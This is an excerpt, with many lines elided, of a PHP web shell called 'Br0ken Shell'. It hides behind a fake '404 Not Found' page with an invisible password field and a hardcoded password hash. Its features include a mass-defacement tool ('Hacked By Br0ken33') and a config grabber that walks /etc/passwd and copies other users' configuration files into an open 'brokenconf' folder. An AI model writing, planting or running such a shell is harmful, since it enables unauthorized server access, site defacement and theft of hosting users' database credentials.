...
$password 			= "5a22244060f9458e6364382a8152043f";   // KNTL1235
$color 				= "#00ff00";
...
?>
   ...
   <title>404 Not Found</title>
    	<form method="post">
    			<input style="border-color:transparent; background-color:transparent;" type="pass"  name="pass" class="form-control">
...
<a href='?dir=$dir&aksi=InfoServer' class='fiture btn btn-info btn-sm btn-block mt-2'>Info Server</a>
		...
		<div class=''>
			<h1 class='text-center'><a href='#'>Br0ken Shell</h1>
	...
	if($_GET['aksi'] == 'MassDeface') {
		...
		echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' placeholder='Hacked By Br0ken33'></textarea><br/>
	...
	*/
	if($_GET['aksi'] == 'config') {
		...
		$con = mkdir("brokenconf", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("brokenconf/.htaccess","w");
		fwrite($htc, $isi_htc);
		while($passwd = fgets($etc)) {
			if($passwd == "" || !$etc) {
					...
					if(is_readable($user_config_dir)) {
						...
						foreach($grab_config as $config => $nama_config) {
							...
							if($ambil_config == '') {
								...
								$file_config = fopen("brokenconf/$user_con-$nama_config.txt","w");
		...
		echo "<center><a href='?dir=$path/brokenconf'><font color=lime>Done</font></a></center>";
	}
...
if($ext == "php") {
		...
		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="#">Br0ken</a></small></center>';
?>